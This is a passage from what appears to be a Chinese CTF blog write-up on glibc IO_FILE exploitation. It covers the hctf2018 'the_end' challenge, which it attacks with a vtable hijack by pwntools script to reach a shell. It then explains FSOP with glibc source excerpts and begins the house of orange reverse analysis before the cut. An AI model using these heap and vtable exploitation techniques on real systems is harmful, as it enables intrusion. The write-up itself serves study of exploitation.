<h2 id="hctf2018-the-end"><a href="#hctf2018-the-end" class="headerlink" title="[hctf2018]the_end"></a><a class="link"   href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end" >[hctf2018]the_end <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195448855.png"
                      alt="image-20231018195448855"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203336478.png"
                      alt="image-20231017203336478"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203259746.png"
                      alt="image-20231017203259746"
                ></p>
<h3 id="试运行"><a href="#试运行" class="headerlink" title="试运行"></a>试运行</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231017203439647.png"
                      alt="image-20231017203439647"
                ></p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">    <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们有五次任意地址写 <code>1</code> 字节的机会，并且给了我们 <code>sleep()</code> 函数的地址。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>glibc-2.23</code> 版本及之前没有 <code>_IO_vtable_check</code> 检查，因此可以伪造 <code>vtable</code> 劫持程序流程。 <code>exit</code> 函数有一条这样的调用链 <code>exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_unbuffer_all-&gt;_IO_SETBUFF(fp, NULL, 0)</code>，这里调用了 <code>_IO_2_1_stdout_</code> 的<code>vatable</code> 中 <code>_setbuf</code> 函数.。但位于 <code>libc</code> 数据段的 <code>vtable</code> 是不可以进行写入的，因为 <code>_IO_jumps_t</code> 的第 <code>11</code> 位是 <code>    JUMP_FIELD(_IO_setbuf_t, __setbuf);</code> 所以我们可以在其附近寻找 <code>fake_vtable</code> 将其 <code>(11*8)0x58</code>  处改为 <code>one_gadget</code> ，当程序退出调用 <code>exit</code> 时将会调用 <code>one_gadget</code> 从而 <code>getshell</code> 。</p>
<p><strong>获取信息</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    <span class="keyword">global</span> one_gadget, stdout_vtable, fake_vtable, stderr_vtable</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;here is a gift &quot;</span>)</span><br><span class="line">    sleep = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;luck ;)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = sleep - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">    one_gadget = libc.address + <span class="number">0xf03a4</span></span><br><span class="line"></span><br><span class="line">    stdout_vtable = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0xd8</span></span><br><span class="line">    stderr_vtable = libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xd8</span></span><br><span class="line">    fake_vtable = stderr_vtable - <span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;libc_base : 0x%x&quot;</span> % libc.address)</span><br><span class="line">    info(<span class="string">&quot;one_gadget : 0x%x&quot;</span> % one_gadget)</span><br><span class="line">    info(<span class="string">&quot;stdout_vtable : 0x%x&quot;</span> % stdout_vtable)</span><br><span class="line">    info(<span class="string">&quot;fake_vtable : 0x%x&quot;</span> % fake_vtable)</span><br><span class="line">    info(<span class="string">&quot;stderr_vtable : 0x%x&quot;</span> % stderr_vtable)</span><br><span class="line"></span><br><span class="line">    debug()</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160216214.png"
                      alt="image-20231018160216214"
                ></p>
<p><code>libc.sym[&#39;_IO_2_1_stdout_&#39;] + 0xd8</code> 是 <code>_IO_2_1_stdout_</code> 的 <code>vtable</code> 指针，<code>glibc-2.23</code>版本<code>x64</code> 的偏移<code>(struct _IO_FILE大小)</code>为 <code>0xd8</code>，<code>x32</code> 减半。</p>
<p><strong>get_shell</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">    p.send(p64(stdout_vtable))</span><br><span class="line">    p.send(p8(fake_vtable&amp;<span class="number">0xff</span>))</span><br><span class="line">    p.send(p64(stdout_vtable+<span class="number">1</span>))</span><br><span class="line">    p.send(p8((fake_vtable&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    p.send(p64(stderr_vtable))</span><br><span class="line">    p.send(p8(one_gadget&amp;<span class="number">0xff</span>))</span><br><span class="line">    p.send(p64(stderr_vtable+<span class="number">1</span>))</span><br><span class="line">    p.send(p8((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.send(p64(stderr_vtable+<span class="number">2</span>))</span><br><span class="line">    p.send(p8((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">b&quot;exec 1&gt;&amp;0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160251059.png"
                      alt="image-20231018160251059"
                ></p>
<p>前两次机会我们可以修改 <code>stdout_vtable</code> 的后 <code>16</code> 位将其指向 <code>fake_vtable</code> 。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160327303.png"
                      alt="image-20231018160327303"
                ></p>
<p>后面三次机会将 <code>fake_vtable</code> 的高 <code>11*8(0x58)</code> 处的 <code>_IO_SETBUF(实际上是 stderr_vtable)</code> 改为 <code>onegadget</code>，因为都在 <code>libc.so</code> 数据段，所以我们只需要修改其后 <code>8*3</code> 位即可。 </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160457056.png"
                      alt="image-20231018160457056"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160514870.png"
                      alt="image-20231018160514870"
                ></p>
<p>最后调用了 <code>one_gadget</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018160702397.png"
                      alt="image-20231018160702397"
                ></p>
<p>但是我这里<code>4</code>  个 <code>one_gadget</code> 都不满足条件，这个方法没打通，哪里有问题还想烦请师傅多多指教。</p>
<p><strong>图解</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hctf2018the_end.png"
                      alt="hctf2018the_end"
                ></p>
<h2 id="FSOP-glibc"><a href="#FSOP-glibc" class="headerlink" title="FSOP(glibc &lt;&#x3D; 2.23)"></a>FSOP(glibc &lt;&#x3D; 2.23)</h2><p><code>FSOP</code> 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 <code>FILE</code> 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code>。<code>FSOP</code> 通过伪造 <code>_IO_jump_t</code> 中的 <code>__overflow</code> 为 <code>system()</code> 函数 地 址 ， 最 终 在 <code>_IO_OVERFLOW(fp,EOF)</code> 函 数 中 执 行 <code>system(&#39;/bin/sh&#39;)</code> 并获得 <code>shell</code>。</p>
<ul>
<li><p><code>_IO_flush_all_lockp</code> 在一些情况下这个函数会被系统调用：</p>
<ol>
<li>当 <code>libc</code> 执行 <code>abort</code> 流程时</li>
</ol>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">abort</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">  	<span class="keyword">if</span> (stage == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	++stage;</span><br><span class="line">      	__fcloseall ();</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>当执行 <code>exit</code> 函数时</li>
</ol>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span> <span class="params">(<span class="type">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">第(<span class="number">1</span>)条链</span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	_exit (status);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">_exit (<span class="type">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  status &amp;= <span class="number">0xff</span>;</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line">第(<span class="number">2</span>)条链</span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li><p>当执行流从 <code>main</code> 函数返回时会执行 <code>exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018191511939.png"
                      alt="image-20231018191511939"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018191606707.png"
                      alt="image-20231018191606707"
                ></p>
</li>
</ol>
</li>
<li><p><code>_IO_flush_all_lockp (int do_lock)</code> 函数需要绕过的检查。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  从_IO_list_all开始, _IO_flush_all_lockp()遍历链表并对每个条目执行一些检查. 如果一个条目通过了所有的检查，</span></span><br><span class="line"><span class="comment">*  _IO_OVERFLOW会从虚表中调用_IO_new_file_overflow()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    * 为了能够让我们构造的 fake_FILE 能够正常工作，还需要以下绕过的检查</span></span><br><span class="line"><span class="comment">    * fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    * fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    * 这里调用了 _IO_OVERFLOW 函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) </span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>还有一条<code>FSOP</code>的路径是在关闭流的时候，在 <code>_IO_FINISH(fp)</code> 的执行过程中最终会调用伪造的 <code>system(&#39;/bin/sh&#39;)</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*_IO_finish_t)</span> <span class="params">(_IO_FILE *, <span class="type">int</span>)</span></span>; <span class="comment">/* finalize */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	_IO_FINISH (fp);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="hctf2016-house-of-orange"><a href="#hctf2016-house-of-orange" class="headerlink" title="[hctf2016]house of orange"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.24_hitconctf2016_house_of_orange" >[hctf2016]house of orange <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查文件信息-1"><a href="#检查文件信息-1" class="headerlink" title="检查文件信息"></a>检查文件信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195547354.png"
                      alt="image-20231018195547354"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195633401.png"
                      alt="image-20231018195633401"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195614081.png"
                      alt="image-20231018195614081"
                ></p>
<p>###试运行</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195709292.png"
                      alt="image-20231018195709292"
                ></p>
<h3 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h3><ul>
<li><code>main</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">Menu</span>();</span><br><span class="line">      v3 = <span class="built_in">get_num</span>(a1, a2);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">See</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">Upgrade</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;give up&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        a1 = <span class="string">&quot;Invalid choice&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="built_in">Build</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>Build</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Build</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len_of_name; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *house; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 orange; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( max_house &gt; <span class="number">3u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too many house&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  house = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  len_of_name = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( len_of_name &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len_of_name = <span class="number">0x1000</span>;</span><br><span class="line">  *((_QWORD *)house + <span class="number">1</span>) = <span class="built_in">malloc</span>(len_of_name);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)house + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error !!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">  <span class="built_in">Read</span>(*((<span class="type">void</span> **)house + <span class="number">1</span>), len_of_name);     <span class="comment">// 这个读取没有截断，可能存在泄露</span></span><br><span class="line">  orange = (__int64)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange:&quot;</span>);</span><br><span class="line">  *(_DWORD *)orange = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="built_in">Color</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">  type = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( type != <span class="number">0xDDAA</span> &amp;&amp; (type &lt;= <span class="number">0</span> || type &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">0xDDAA</span> )</span><br><span class="line">    *(_DWORD *)(orange + <span class="number">4</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(orange + <span class="number">4</span>) = type + <span class="number">0x1E</span>;</span><br><span class="line">  *(_QWORD *)house = orange;</span><br><span class="line">  house_list = house;</span><br><span class="line">  ++max_house;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其结构大致为:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosa_struct.png"
                      alt="hosa_struct"
                ></p>
<p>其中 <code>orange</code> 是通过 <code>calloc</code> 申请的。</p>
<ul>
<li><code>See</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_EE6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !house_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*house_list + <span class="number">4LL</span>) == <span class="number">0xDDAA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of house : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)house_list[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Price of orange : %d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)*house_list);</span><br><span class="line">    v0 = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[01;38;5;214m%s\x1B[0m\n&quot;</span>, *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_203080 + v0 % <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">int</span> *)(*house_list + <span class="number">4LL</span>) &lt;= <span class="number">0x1E</span> || *(<span class="type">int</span> *)(*house_list + <span class="number">4LL</span>) &gt; <span class="number">0x25</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Color corruption!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of house : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)house_list[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Price of orange : %d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)*house_list);</span><br><span class="line">    v2 